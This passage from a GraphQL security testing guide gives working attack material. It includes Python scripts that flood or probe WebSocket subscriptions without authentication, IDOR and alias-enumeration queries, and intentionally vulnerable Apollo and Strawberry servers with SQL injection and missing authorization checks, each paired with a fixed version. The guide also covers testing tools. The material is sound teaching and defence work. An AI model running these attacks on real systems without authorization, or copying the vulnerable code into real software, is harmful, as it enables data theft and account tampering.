    async with websockets.connect(url, subprotocols=['graphql-ws']) as ws:
        # Connection init
        await ws.send(json.dumps({"type": "connection_init"}))
        await ws.recv()

        # Subscribe
        await ws.send(json.dumps({
            "type": "start",
            "id": "1",
            "payload": {"query": query}
        }))

        # Keep connection alive
        while True:
            try:
                msg = await ws.recv()
                print(f"Received: {msg[:100]}")
            except websockets.exceptions.ConnectionClosed:
                break

async def main():
    url = "ws://target.example.com/graphql"
    query = """
        subscription {
            messageCreated {
                id content author { name email friends { name } }
            }
        }
    """

    # Open 100 concurrent subscriptions
    tasks = [open_subscription(url, query) for _ in range(100)]
    await asyncio.gather(*tasks)

asyncio.run(main())
```

### Subscription Information Disclosure

Subscribing to admin-only events:

```json
{
  "type": "start",
  "id": "1",
  "payload": {
    "query": "subscription { systemAlert { severity message affectedService internalIp stackTrace } }"
  }
}
```

```json
{
  "type": "start",
  "id": "2",
  "payload": {
    "query": "subscription { newUserRegistration { id email ip country deviceFingerprint } }"
  }
}
```

### WebSocket Authentication Testing

Many implementations authenticate the initial HTTP upgrade but not the subscription queries themselves:

```python
import websockets
import json

async def test_unauth_subscription():
    # Connect WITHOUT any auth headers
    async with websockets.connect(
        "ws://target.example.com/graphql",
        subprotocols=['graphql-ws']
    ) as ws:
        await ws.send(json.dumps({"type": "connection_init"}))
        init_response = await ws.recv()
        print(f"Init response: {init_response}")

        if "connection_ack" in init_response:
            print("[!] WebSocket accepted without authentication!")

            await ws.send(json.dumps({
                "type": "start",
                "id": "1",
                "payload": {
                    "query": "subscription { orderUpdated { id status amount } }"
                }
            }))

            response = await ws.recv()
            print(f"Subscription response: {response}")
```

---

## 12. GraphQL IDOR

### IDOR in GraphQL Queries

GraphQL makes IDOR testing straightforward because the ID parameter is always visible in the query:

```graphql
# Your own profile
{ user(id: "550e8400-e29b-41d4-a716-446655440000") { name email ssn } }

# Another user's profile (change the UUID)
{ user(id: "550e8400-e29b-41d4-a716-446655440001") { name email ssn } }
```

### IDOR in Mutations

```graphql
# Updating your own profile
mutation {
  updateProfile(userId: "your-id", input: { name: "New Name" }) {
    id name
  }
}

# Updating someone else's profile
mutation {
  updateProfile(userId: "victim-id", input: { name: "Hacked" }) {
    id name
  }
}
```

### IDOR via Nested Relationships

Sometimes the top-level query is properly authorized, but nested relationships leak data:

```graphql
# Direct access is blocked
{ user(id: "victim-id") { name } }
# Error: "Not authorized"

# But accessing through a shared resource works
{ project(id: "shared-project-id") {
    members {
      id
      name
      email
      role
      personalPhone
    }
  }
}
```

### Sequential ID Enumeration

If the API uses sequential integer IDs:

```http
POST /graphql HTTP/1.1
Host: target.example.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

{
  "query": "{ i1: invoice(id: 1001) { id amount customer { name email } } i2: invoice(id: 1002) { id amount customer { name email } } i3: invoice(id: 1003) { id amount customer { name email } } i4: invoice(id: 1004) { id amount customer { name email } } i5: invoice(id: 1005) { id amount customer { name email } } }"
}
```

Using aliases, you can enumerate hundreds of resources in a single request. If any return data that belongs to other users, you have confirmed an IDOR.

### UUID Enumeration

Even with UUIDs, IDOR is still possible if UUIDs are leaked through:

- Error messages containing user IDs
- Other API responses that list user IDs
- Public profiles with UUIDs in URLs
- Subscription events that include user IDs
- GraphQL responses to batch queries that include `authorId` or similar fields

```graphql
# Extract UUIDs from a public listing
{
  publicPosts {
    id
    title
    author {
      id      # This UUID can be used for IDOR on other endpoints
      name
    }
  }
}

# Use the extracted UUID to access private data
{
  user(id: "extracted-uuid") {
    email
    phone
    address
    paymentMethods {
      last4
      type
    }
  }
}
```

---

## 13. Express.js Apollo Server: Vulnerable + Fixed Code

### Vulnerable Implementation

```javascript
const { ApolloServer } = require('@apollo/server');
const { expressMiddleware } = require('@apollo/server/express4');
const express = require('express');
const { makeExecutableSchema } = require('@graphql-tools/schema');
const jwt = require('jsonwebtoken');
const { Pool } = require('pg');

const pool = new Pool({ connectionString: process.env.DATABASE_URL });

const typeDefs = `#graphql
  type User {
    id: ID!
    name: String!
    email: String!
    role: String!
    passwordHash: String        # VULNERABLE: Sensitive field exposed in schema
    ssn: String                 # VULNERABLE: PII exposed in schema
    apiKey: String              # VULNERABLE: Secret exposed in schema
    internalNotes: String       # VULNERABLE: Internal data in schema
    friends: [User!]!           # VULNERABLE: No depth limit on circular reference
  }

  type Query {
    me: User
    user(id: ID!): User         # VULNERABLE: No authorization check
    users(role: String): [User!]!
    adminDashboard: AdminDashboard  # VULNERABLE: No authorization on admin query
    internalMetrics(service: String): Metrics
  }

  type AdminDashboard {
    totalUsers: Int!
    totalRevenue: Float!
    recentSignups: [User!]!
  }

  type Metrics {
    cpu: Float!
    memory: Float!
    requestCount: Int!
  }

  type Mutation {
    login(email: String!, password: String!): AuthPayload
    updateUser(id: ID!, input: UpdateUserInput!): User  # VULNERABLE: No ownership check
    deleteUser(id: ID!): Boolean                         # VULNERABLE: No admin check
    updateUserRole(userId: ID!, role: String!): User     # VULNERABLE: No admin check
  }

  input UpdateUserInput {
    name: String
    email: String
    role: String                # VULNERABLE: Users can set their own role
  }

  type AuthPayload {
    token: String!
    user: User!
  }
`;

const resolvers = {
  Query: {
    // VULNERABLE: Returns all fields including sensitive ones
    me: async (_, __, context) => {
      if (!context.user) throw new Error('Not authenticated');
      const result = await pool.query('SELECT * FROM users WHERE id = $1', [context.user.id]);
      return result.rows[0];
    },

    // VULNERABLE: No authorization - any authenticated user can query any other user
    user: async (_, { id }) => {
      const result = await pool.query('SELECT * FROM users WHERE id = $1', [id]);
      return result.rows[0];
    },

    // VULNERABLE: No authorization on admin-only query
    adminDashboard: async () => {
      const users = await pool.query('SELECT COUNT(*) as count FROM users');
      const revenue = await pool.query('SELECT SUM(amount) as total FROM payments');
      const recent = await pool.query('SELECT * FROM users ORDER BY created_at DESC LIMIT 10');
      return {
        totalUsers: users.rows[0].count,
        totalRevenue: revenue.rows[0].total,
        recentSignups: recent.rows,
      };
    },

    // VULNERABLE: Exposes internal infrastructure metrics
    internalMetrics: async (_, { service }) => {
      return { cpu: 45.2, memory: 72.1, requestCount: 15000 };
    },

    // VULNERABLE: SQL injection via string interpolation
    users: async (_, { role }) => {
      const query = role
        ? `SELECT * FROM users WHERE role = '${role}'`  // SQL INJECTION!
        : 'SELECT * FROM users';
      const result = await pool.query(query);
      return result.rows;
    },
  },

  User: {
    // VULNERABLE: No depth limiting on friends - enables DoS
    friends: async (user) => {
      const result = await pool.query(
        'SELECT u.* FROM users u JOIN friendships f ON u.id = f.friend_id WHERE f.user_id = $1',
        [user.id]
      );
      return result.rows;
    },
  },

  Mutation: {
    login: async (_, { email, password }) => {
      // ... login logic (simplified)
      const result = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
      const user = result.rows[0];
      // ... verify password
      const token = jwt.sign({ id: user.id, role: user.role }, process.env.JWT_SECRET);
      return { token, user };
    },

    // VULNERABLE: No ownership check - any user can update any other user
    updateUser: async (_, { id, input }) => {
      const setClauses = Object.entries(input)
        .map(([key, value], i) => `${key} = $${i + 2}`)
        .join(', ');
      const values = [id, ...Object.values(input)];
      const result = await pool.query(
        `UPDATE users SET ${setClauses} WHERE id = $1 RETURNING *`,
        values
      );
      return result.rows[0];
    },

    // VULNERABLE: No admin check
    deleteUser: async (_, { id }) => {
      await pool.query('DELETE FROM users WHERE id = $1', [id]);
      return true;
    },

    // VULNERABLE: No admin check - any user can change any user's role
    updateUserRole: async (_, { userId, role }) => {
      const result = await pool.query(
        'UPDATE users SET role = $1 WHERE id = $2 RETURNING *',
        [role, userId]
      );
      return result.rows[0];
    },
  },
};

const app = express();
app.use(express.json());

const server = new ApolloServer({
  schema: makeExecutableSchema({ typeDefs, resolvers }),
  introspection: true,    // VULNERABLE: Introspection enabled in production
});

async function start() {
  await server.start();
  app.use('/graphql', expressMiddleware(server, {
    context: async ({ req }) => {
      const token = req.headers.authorization?.replace('Bearer ', '');
      if (token) {
        try {
          const user = jwt.verify(token, process.env.JWT_SECRET);
          return { user };
        } catch {
          return {};
        }
      }
      return {};
    },
  }));
  app.listen(4000);
}

start();
```

### Fixed Implementation

```javascript
const { ApolloServer } = require('@apollo/server');
const { expressMiddleware } = require('@apollo/server/express4');
const express = require('express');
const { makeExecutableSchema } = require('@graphql-tools/schema');
const jwt = require('jsonwebtoken');
const { Pool } = require('pg');
const depthLimit = require('graphql-depth-limit');
const { createComplexityLimitRule } = require('graphql-validation-complexity');

const pool = new Pool({ connectionString: process.env.DATABASE_URL });

// ---- Authorization helpers ----

function requireAuth(context) {
  if (!context.user) {
    throw new Error('Authentication required');
  }
  return context.user;
}

function requireAdmin(context) {
  const user = requireAuth(context);
  if (user.role !== 'ADMIN') {
    throw new Error('Admin access required');
  }
  return user;
}

function requireOwnerOrAdmin(context, resourceUserId) {
  const user = requireAuth(context);
  if (user.id !== resourceUserId && user.role !== 'ADMIN') {
    throw new Error('Not authorized to access this resource');
  }
  return user;
}

// ---- Schema: Sensitive fields REMOVED from public types ----

const typeDefs = `#graphql
  type User {
    id: ID!
    name: String!
    email: String!
    role: String!
    # passwordHash: REMOVED - never expose
    # ssn: REMOVED - never expose
    # apiKey: REMOVED - never expose in user type
    # internalNotes: REMOVED - only in admin-specific type
    friends: [User!]!
  }

  # Separate type for admin views with additional fields
  type AdminUserView {
    id: ID!
    name: String!
    email: String!
    role: String!
    internalNotes: String
    createdAt: String!
    lastLogin: String
  }

  type Query {
    me: User
    user(id: ID!): User
    users(limit: Int, offset: Int): [User!]!
    adminDashboard: AdminDashboard
  }

  type AdminDashboard {
    totalUsers: Int!
    totalRevenue: Float!
    recentSignups: [AdminUserView!]!
  }

  # internalMetrics REMOVED from public schema entirely

  type Mutation {
    login(email: String!, password: String!): AuthPayload
    updateMyProfile(input: UpdateProfileInput!): User
    adminUpdateUser(id: ID!, input: AdminUpdateUserInput!): AdminUserView
    adminDeleteUser(id: ID!): Boolean
  }

  input UpdateProfileInput {
    name: String
    email: String
    # role: REMOVED - users cannot change their own role
  }

  input AdminUpdateUserInput {
    name: String
    email: String
    role: String
    internalNotes: String
  }

  type AuthPayload {
    token: String!
    user: User!
  }
`;

// ---- Safe field set: only return these columns from users table ----
const PUBLIC_USER_FIELDS = 'id, name, email, role';
const ADMIN_USER_FIELDS = 'id, name, email, role, internal_notes, created_at, last_login';

const resolvers = {
  Query: {
    me: async (_, __, context) => {
      const user = requireAuth(context);
      const result = await pool.query(
        `SELECT ${PUBLIC_USER_FIELDS} FROM users WHERE id = $1`,
        [user.id]
      );
      return result.rows[0];
    },

    // FIXED: Authorization check - only self or admin
    user: async (_, { id }, context) => {
      const user = requireAuth(context);
      // Regular users can only view themselves
      // Admins can view anyone
      if (user.id !== id && user.role !== 'ADMIN') {
        throw new Error('Not authorized');
      }
      const result = await pool.query(
        `SELECT ${PUBLIC_USER_FIELDS} FROM users WHERE id = $1`,
        [id]
      );
      return result.rows[0];
    },

    // FIXED: Admin-only with proper authorization
    adminDashboard: async (_, __, context) => {
      requireAdmin(context);
      const users = await pool.query('SELECT COUNT(*) as count FROM users');
      const revenue = await pool.query('SELECT SUM(amount) as total FROM payments');
      const recent = await pool.query(
        `SELECT ${ADMIN_USER_FIELDS} FROM users ORDER BY created_at DESC LIMIT 10`
      );
      return {
        totalUsers: parseInt(users.rows[0].count),
        totalRevenue: parseFloat(revenue.rows[0].total),
        recentSignups: recent.rows,
      };
    },

    // FIXED: Parameterized query, pagination limits
    users: async (_, { limit = 20, offset = 0 }, context) => {
      requireAuth(context);
      const safeLimit = Math.min(Math.max(1, limit), 100); // Cap at 100
      const safeOffset = Math.max(0, offset);
      const result = await pool.query(
        `SELECT ${PUBLIC_USER_FIELDS} FROM users LIMIT $1 OFFSET $2`,
        [safeLimit, safeOffset]
      );
      return result.rows;
    },
  },

  User: {
    // FIXED: Limited friends query (cannot be nested indefinitely due to depth limit)
    friends: async (user, _, context) => {
      requireAuth(context);
      const result = await pool.query(
        `SELECT ${PUBLIC_USER_FIELDS} FROM users u
         JOIN friendships f ON u.id = f.friend_id
         WHERE f.user_id = $1 LIMIT 50`,
        [user.id]
      );
      return result.rows;
    },
  },

  Mutation: {
    login: async (_, { email, password }) => {
      const result = await pool.query(
        'SELECT id, name, email, role, password_hash FROM users WHERE email = $1',
        [email]
      );
      const user = result.rows[0];
      if (!user) throw new Error('Invalid credentials');

      // Use bcrypt.compare in real code
      const bcrypt = require('bcrypt');
      const valid = await bcrypt.compare(password, user.password_hash);
      if (!valid) throw new Error('Invalid credentials');

      const token = jwt.sign(
        { id: user.id, role: user.role },
        process.env.JWT_SECRET,
        { expiresIn: '1h' }
      );

      // Do not return password_hash
      const { password_hash, ...safeUser } = user;
      return { token, user: safeUser };
    },

    // FIXED: Users can only update their OWN profile, limited fields
    updateMyProfile: async (_, { input }, context) => {
      const user = requireAuth(context);

      // Whitelist allowed fields
      const allowedFields = ['name', 'email'];
      const updates = {};
      for (const field of allowedFields) {
        if (input[field] !== undefined) {
          updates[field] = input[field];
        }
      }

      if (Object.keys(updates).length === 0) {
        throw new Error('No valid fields to update');
      }

      const setClauses = Object.keys(updates)
        .map((key, i) => `${key} = $${i + 2}`)
        .join(', ');
      const values = [user.id, ...Object.values(updates)];

      const result = await pool.query(
        `UPDATE users SET ${setClauses} WHERE id = $1 RETURNING ${PUBLIC_USER_FIELDS}`,
        values
      );
      return result.rows[0];
    },

    // FIXED: Admin-only mutation with proper authorization
    adminUpdateUser: async (_, { id, input }, context) => {
      requireAdmin(context);

      const allowedFields = ['name', 'email', 'role', 'internal_notes'];
      const updates = {};
      for (const field of allowedFields) {
        const inputKey = field === 'internal_notes' ? 'internalNotes' : field;
        if (input[inputKey] !== undefined) {
          updates[field] = input[inputKey];
        }
      }

      if (Object.keys(updates).length === 0) {
        throw new Error('No valid fields to update');
      }

      const setClauses = Object.keys(updates)
        .map((key, i) => `${key} = $${i + 2}`)
        .join(', ');
      const values = [id, ...Object.values(updates)];

      const result = await pool.query(
        `UPDATE users SET ${setClauses} WHERE id = $1 RETURNING ${ADMIN_USER_FIELDS}`,
        values
      );
      return result.rows[0];
    },

    // FIXED: Admin-only deletion
    adminDeleteUser: async (_, { id }, context) => {
      requireAdmin(context);

      // Prevent admin from deleting themselves
      if (context.user.id === id) {
        throw new Error('Cannot delete your own account via admin endpoint');
      }

      const result = await pool.query('DELETE FROM users WHERE id = $1', [id]);
      return result.rowCount > 0;
    },
  },
};

const app = express();
app.use(express.json({ limit: '100kb' })); // Limit request body size

const server = new ApolloServer({
  schema: makeExecutableSchema({ typeDefs, resolvers }),
  introspection: process.env.NODE_ENV !== 'production',  // FIXED: Disabled in production
  validationRules: [
    depthLimit(5),                                         // FIXED: Max query depth of 5
    createComplexityLimitRule(1000),                        // FIXED: Query complexity limit
  ],
  formatError: (formattedError) => {
    // FIXED: Remove field suggestions and stack traces
    const message = formattedError.message
      .replace(/Did you mean.*$/, '')
      .trim();

    // Never expose stack traces in production
    if (process.env.NODE_ENV === 'production') {
      return { message };
    }
    return { ...formattedError, message };
  },
  plugins: [
    // FIXED: Alias limiting plugin
    {
      requestDidStart() {
        return {
          async didResolveOperation(requestContext) {
            const { operation } = requestContext;
            if (operation) {
              const fieldCount = operation.selectionSet.selections.length;
              if (fieldCount > 10) {
                throw new Error(
                  `Query has ${fieldCount} top-level fields, exceeding the maximum of 10.`
                );
              }
            }
          },
        };
      },
    },
  ],
});

async function start() {
  await server.start();
  app.use('/graphql', expressMiddleware(server, {
    context: async ({ req }) => {
      const token = req.headers.authorization?.replace('Bearer ', '');
      if (token) {
        try {
          const user = jwt.verify(token, process.env.JWT_SECRET);
          return { user };
        } catch {
          return {};
        }
      }
      return {};
    },
  }));

  // FIXED: Disable batch queries (if not needed)
  // Apollo Server 4 does not support batching by default; ensure no middleware re-enables it

  app.listen(4000);
}

start();
```

### Summary of Fixes

| Vulnerability | Fix Applied |
|--------------|-------------|
| Introspection in production | `introspection: process.env.NODE_ENV !== 'production'` |
| Sensitive fields in schema | Removed `passwordHash`, `ssn`, `apiKey` from type definitions |
| No query depth limit | `depthLimit(5)` validation rule |
| No complexity limit | `createComplexityLimitRule(1000)` |
| IDOR on user query | Authorization check: self or admin only |
| Admin queries without auth | `requireAdmin()` check |
| Mutations without ownership check | Separate `updateMyProfile` (self) and `adminUpdateUser` (admin) |
| SQL injection in `users` resolver | Parameterized queries throughout |
| Field suggestions enabled | `formatError` strips suggestions |
| Alias abuse | Plugin limits top-level fields to 10 |
| Role field in user update | Removed `role` from `UpdateProfileInput` |

---

## 14. FastAPI Strawberry: Vulnerable + Fixed Code

### Vulnerable Implementation

```python
import strawberry
from strawberry.fastapi import GraphQLRouter
from fastapi import FastAPI
import asyncpg
import jwt
import os
from typing import Optional

DATABASE_URL = os.getenv("DATABASE_URL")
JWT_SECRET = os.getenv("JWT_SECRET")


@strawberry.type
class User:
    id: str
    name: str
    email: str
    role: str
    password_hash: str      # VULNERABLE: Exposed to clients
    ssn: Optional[str]      # VULNERABLE: PII exposed
    api_key: Optional[str]  # VULNERABLE: Secret exposed
    internal_notes: Optional[str]  # VULNERABLE: Internal data exposed


@strawberry.type
class AuthPayload:
    token: str
    user: User


@strawberry.input
class UpdateUserInput:
    name: Optional[str] = None
    email: Optional[str] = None
    role: Optional[str] = None  # VULNERABLE: Users can set their own role


# VULNERABLE: No depth limiting, no complexity analysis
@strawberry.type
class Query:
    @strawberry.field
    async def me(self, info) -> Optional[User]:
        user = info.context.get("user")
        if not user:
            raise Exception("Not authenticated")
        pool = info.context["pool"]
        row = await pool.fetchrow("SELECT * FROM users WHERE id = $1", user["id"])
        return User(**dict(row)) if row else None

    # VULNERABLE: No authorization - any user can query any other user
    @strawberry.field
    async def user(self, info, id: str) -> Optional[User]:
        pool = info.context["pool"]
        row = await pool.fetchrow("SELECT * FROM users WHERE id = $1", id)
        return User(**dict(row)) if row else None

    # VULNERABLE: SQL injection via string interpolation
    @strawberry.field
    async def users(self, info, role: Optional[str] = None) -> list[User]:
        pool = info.context["pool"]
        if role:
            # SQL INJECTION!
            rows = await pool.fetch(f"SELECT * FROM users WHERE role = '{role}'")
        else:
            rows = await pool.fetch("SELECT * FROM users")
        return [User(**dict(row)) for row in rows]

    # VULNERABLE: No admin authorization
    @strawberry.field
    async def admin_dashboard(self, info) -> str:
        pool = info.context["pool"]
        count = await pool.fetchval("SELECT COUNT(*) FROM users")
        return f"Total users: {count}"


@strawberry.type
class Mutation:
    # VULNERABLE: No ownership check
    @strawberry.mutation
    async def update_user(self, info, id: str, input: UpdateUserInput) -> Optional[User]:
        pool = info.context["pool"]
        updates = {}
        if input.name is not None:
            updates["name"] = input.name
        if input.email is not None:
            updates["email"] = input.email
        if input.role is not None:  # VULNERABLE: Allows role escalation
            updates["role"] = input.role

        if not updates:
            raise Exception("No fields to update")

        set_clause = ", ".join(f"{k} = ${i+2}" for i, k in enumerate(updates.keys()))
        values = [id] + list(updates.values())
        row = await pool.fetchrow(
            f"UPDATE users SET {set_clause} WHERE id = $1 RETURNING *",
            *values
        )
        return User(**dict(row)) if row else None

    # VULNERABLE: No admin check
    @strawberry.mutation
    async def delete_user(self, info, id: str) -> bool:
        pool = info.context["pool"]
        result = await pool.execute("DELETE FROM users WHERE id = $1", id)
        return "DELETE 1" in result


schema = strawberry.Schema(query=Query, mutation=Mutation)

app = FastAPI()

async def get_context(request):
    pool = app.state.pool
    context = {"pool": pool}

    auth_header = request.headers.get("authorization", "")
    if auth_header.startswith("Bearer "):
        token = auth_header[7:]
        try:
            user = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
            context["user"] = user
        except jwt.InvalidTokenError:
            pass

    return context

graphql_app = GraphQLRouter(schema, context_getter=get_context)
app.include_router(graphql_app, prefix="/graphql")
```

### Fixed Implementation

```python
import strawberry
from strawberry.fastapi import GraphQLRouter
from strawberry.extensions import QueryDepthLimiter
from strawberry.permission import BasePermission
from fastapi import FastAPI, Request
import asyncpg
import jwt
import os
import bcrypt
from typing import Optional
from starlette.websockets import WebSocket

DATABASE_URL = os.getenv("DATABASE_URL")
JWT_SECRET = os.getenv("JWT_SECRET")
IS_PRODUCTION = os.getenv("ENV") == "production"

# ---- Safe column sets ----
PUBLIC_USER_COLUMNS = "id, name, email, role"
ADMIN_USER_COLUMNS = "id, name, email, role, internal_notes, created_at, last_login"


# ---- Permission classes ----

class IsAuthenticated(BasePermission):
    message = "Authentication required"

    async def has_permission(self, source, info, **kwargs) -> bool:
        return info.context.get("user") is not None


class IsAdmin(BasePermission):
    message = "Admin access required"

    async def has_permission(self, source, info, **kwargs) -> bool:
        user = info.context.get("user")
        return user is not None and user.get("role") == "ADMIN"


# ---- Types: Sensitive fields REMOVED ----

@strawberry.type
class User:
    id: str
    name: str
    email: str
    role: str
    # password_hash: REMOVED
    # ssn: REMOVED
    # api_key: REMOVED
    # internal_notes: REMOVED (only in AdminUserView)


@strawberry.type
class AdminUserView:
    id: str
    name: str
    email: str
    role: str
    internal_notes: Optional[str]
    created_at: Optional[str]
    last_login: Optional[str]


@strawberry.type
class AuthPayload:
    token: str
    user: User


@strawberry.input
class UpdateProfileInput:
    name: Optional[str] = None
    email: Optional[str] = None
    # role: REMOVED from user-facing input


@strawberry.input
class AdminUpdateUserInput:
    name: Optional[str] = None
    email: Optional[str] = None
    role: Optional[str] = None
    internal_notes: Optional[str] = None


# ---- Queries ----

@strawberry.type
class Query:
    @strawberry.field(permission_classes=[IsAuthenticated])
    async def me(self, info) -> Optional[User]:
        user = info.context["user"]
        pool = info.context["pool"]
        row = await pool.fetchrow(
            f"SELECT {PUBLIC_USER_COLUMNS} FROM users WHERE id = $1",
            user["id"]
        )
        return User(**dict(row)) if row else None

    # FIXED: Admin-only, or self-access
    @strawberry.field(permission_classes=[IsAuthenticated])
    async def user(self, info, id: str) -> Optional[User]:
        current_user = info.context["user"]
        if current_user["id"] != id and current_user.get("role") != "ADMIN":
            raise PermissionError("Not authorized to view this user")

        pool = info.context["pool"]
        row = await pool.fetchrow(
            f"SELECT {PUBLIC_USER_COLUMNS} FROM users WHERE id = $1",
            id
        )
        return User(**dict(row)) if row else None

    # FIXED: Parameterized query, pagination, authentication required
    @strawberry.field(permission_classes=[IsAuthenticated])
    async def users(
        self, info, limit: int = 20, offset: int = 0
    ) -> list[User]:
        pool = info.context["pool"]
        safe_limit = min(max(1, limit), 100)
        safe_offset = max(0, offset)
        rows = await pool.fetch(
            f"SELECT {PUBLIC_USER_COLUMNS} FROM users LIMIT $1 OFFSET $2",
            safe_limit, safe_offset
        )
        return [User(**dict(row)) for row in rows]

    # FIXED: Admin-only
    @strawberry.field(permission_classes=[IsAdmin])
    async def admin_dashboard(self, info) -> str:
        pool = info.context["pool"]
        count = await pool.fetchval("SELECT COUNT(*) FROM users")
        return f"Total users: {count}"


# ---- Mutations ----

@strawberry.type
class Mutation:
    @strawberry.mutation
    async def login(self, info, email: str, password: str) -> AuthPayload:
        pool = info.context["pool"]
        row = await pool.fetchrow(
            "SELECT id, name, email, role, password_hash FROM users WHERE email = $1",
            email
        )
        if not row:
            raise Exception("Invalid credentials")

        if not bcrypt.checkpw(password.encode(), row["password_hash"].encode()):
            raise Exception("Invalid credentials")

        token = jwt.encode(
            {"id": row["id"], "role": row["role"]},
            JWT_SECRET,
            algorithm="HS256"
        )

        user = User(
            id=row["id"],
            name=row["name"],
            email=row["email"],
            role=row["role"],
        )
        return AuthPayload(token=token, user=user)

    # FIXED: Users can only update their OWN profile, limited fields
    @strawberry.mutation(permission_classes=[IsAuthenticated])
    async def update_my_profile(
        self, info, input: UpdateProfileInput
    ) -> Optional[User]:
        current_user = info.context["user"]
        pool = info.context["pool"]

        allowed_fields = {"name", "email"}
        updates = {}
        for field in allowed_fields:
            value = getattr(input, field, None)
            if value is not None:
                updates[field] = value

        if not updates:
            raise Exception("No valid fields to update")

        set_clause = ", ".join(
            f"{k} = ${i+2}" for i, k in enumerate(updates.keys())
        )
        values = [current_user["id"]] + list(updates.values())
        row = await pool.fetchrow(
            f"UPDATE users SET {set_clause} WHERE id = $1 RETURNING {PUBLIC_USER_COLUMNS}",
            *values
        )
        return User(**dict(row)) if row else None

    # FIXED: Admin-only mutation
    @strawberry.mutation(permission_classes=[IsAdmin])
    async def admin_update_user(
        self, info, id: str, input: AdminUpdateUserInput
    ) -> Optional[AdminUserView]:
        pool = info.context["pool"]

        allowed_fields = {"name", "email", "role", "internal_notes"}
        updates = {}
        for field in allowed_fields:
            value = getattr(input, field, None)
            if value is not None:
                updates[field] = value

        if not updates:
            raise Exception("No valid fields to update")

        set_clause = ", ".join(
            f"{k} = ${i+2}" for i, k in enumerate(updates.keys())
        )
        values = [id] + list(updates.values())
        row = await pool.fetchrow(
            f"UPDATE users SET {set_clause} WHERE id = $1 RETURNING {ADMIN_USER_COLUMNS}",
            *values
        )
        return AdminUserView(**dict(row)) if row else None

    # FIXED: Admin-only deletion
    @strawberry.mutation(permission_classes=[IsAdmin])
    async def admin_delete_user(self, info, id: str) -> bool:
        current_user = info.context["user"]
        if current_user["id"] == id:
            raise Exception("Cannot delete your own account")

        pool = info.context["pool"]
        result = await pool.execute("DELETE FROM users WHERE id = $1", id)
        return "DELETE 1" in result


# ---- Schema with depth limiting ----

schema = strawberry.Schema(
    query=Query,
    mutation=Mutation,
    extensions=[
        QueryDepthLimiter(max_depth=5),
    ],
)

# ---- App setup ----

app = FastAPI()


async def get_context(request: Request = None, ws: WebSocket = None):
    pool = app.state.pool
    context = {"pool": pool}

    # Get auth from HTTP request or WebSocket
    source = request or ws
    if source:
        auth_header = ""
        if hasattr(source, "headers"):
            auth_header = source.headers.get("authorization", "")

        if auth_header.startswith("Bearer "):
            token = auth_header[7:]
            try:
                user = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
                context["user"] = user
            except jwt.InvalidTokenError:
                pass

    return context


graphql_app = GraphQLRouter(
    schema,
    context_getter=get_context,
    # FIXED: Disable introspection in production
    # Note: Strawberry does not have a direct toggle; use a custom extension or
    # validation rule to block introspection queries in production
)
app.include_router(graphql_app, prefix="/graphql")


@app.on_event("startup")
async def startup():
    app.state.pool = await asyncpg.create_pool(DATABASE_URL)


@app.on_event("shutdown")
async def shutdown():
    await app.state.pool.close()
```

---

## 15. Tools: InQL, graphql-voyager, Altair

### InQL (Burp Suite Extension)

InQL is the primary Burp Suite extension for GraphQL security testing. It provides schema extraction, query generation, and attack payload creation.

**Installation:**

1. Open Burp Suite -> Extender -> BApp Store
2. Search for "InQL"
3. Click Install

**Key Features:**

- **Schema analysis**: Automatically extracts and parses the GraphQL schema via introspection
- **Query generator**: Creates sample queries and mutations for every operation in the schema
- **Scanner**: Identifies common GraphQL vulnerabilities (introspection enabled, field exposure, etc.)
- **Attacker**: Generates payloads for batch queries, deep nesting, and other attacks

**Usage workflow:**

1. Set the target endpoint (e.g., `https://target.example.com/graphql`)
2. InQL sends an introspection query and parses the result
3. Review the generated queries in the InQL tab
4. Right-click any generated query to send it to Repeater or Intruder
5. Use the "Attacker" feature to generate DoS payloads (nested queries, batch requests)

**InQL Scanner output example:**

```
[INFO] Introspection enabled: YES
[INFO] Types discovered: 23
[INFO] Queries discovered: 12
[INFO] Mutations discovered: 8
[INFO] Subscriptions discovered: 3
[WARNING] Sensitive field found: User.passwordHash (String)
[WARNING] Sensitive field found: User.ssn (String)
[WARNING] Admin query accessible: adminDashboard
[WARNING] Deprecated field found: User.legacyApiKey (deprecated since v2)
```

### graphql-voyager

graphql-voyager provides an interactive visual representation of the GraphQL schema as a graph. This is invaluable for understanding complex schemas and identifying relationship chains for IDOR and authorization testing.

**Setup (standalone):**

```html
<!DOCTYPE html>
<html>
<head>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/graphql-voyager/dist/voyager.css" />
  <script src="https://cdn.jsdelivr.net/npm/graphql-voyager/dist/voyager.standalone.js"></script>
</head>
<body>
  <div id="voyager" style="height: 100vh;"></div>
  <script>
    GraphQLVoyager.init(document.getElementById('voyager'), {
      introspection: fetch('https://target.example.com/graphql', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer YOUR_TOKEN_HERE'
        },
        body: JSON.stringify({
          query: `{ __schema { queryType { name } mutationType { name } types { kind name description fields(includeDeprecated: true) { name description args { name type { kind name ofType { kind name } } } type { kind name ofType { kind name ofType { kind name } } } } } } }`
        })
      }).then(r => r.json())
    });
  </script>
</body>
</html>
```

**What to look for in voyager:**

- **Circular relationships**: `User -> Friends -> User` -- potential for deep nesting DoS
- **High-connectivity types**: Types connected to many other types are good targets for over-fetching
- **Admin types**: Types like `AdminDashboard`, `InternalMetric` that should not be accessible
- **Relationship chains**: `Order -> Customer -> PaymentMethods -> CreditCard` -- chains that might bypass authorization at intermediate steps

### Altair GraphQL Client

Altair is a full-featured GraphQL IDE (like GraphiQL/Apollo Sandbox) with additional security testing capabilities.

**Key features for security testing:**

- **Request headers**: Easily set Authorization headers, custom headers
- **Variables panel**: Test different variable values quickly
- **Request history**: Track all queries and responses
- **Schema documentation**: Browse the schema inline
- **Subscriptions support**: Test WebSocket subscriptions
- **File uploads**: Test multipart upload mutations
- **Multiple windows**: Test with different auth tokens side by side
- **Query collections**: Save attack payloads for reuse

**Installation:**

```bash
# Standalone app (recommended)
# Download from: https://altairgraphql.dev/

# Chrome extension
# Available in Chrome Web Store

# npm (for development)
npm install altair-graphql
```

**Security testing workflow in Altair:**

1. Set the GraphQL endpoint URL
2. Run an introspection query to load the schema
3. Browse types in the Docs panel, noting sensitive fields
4. For each query/mutation, test with different auth levels:
   - Remove the Authorization header entirely
   - Use a regular user token
   - Modify IDs to test IDOR
5. Save working exploits as named queries in collections

### Other Useful Tools

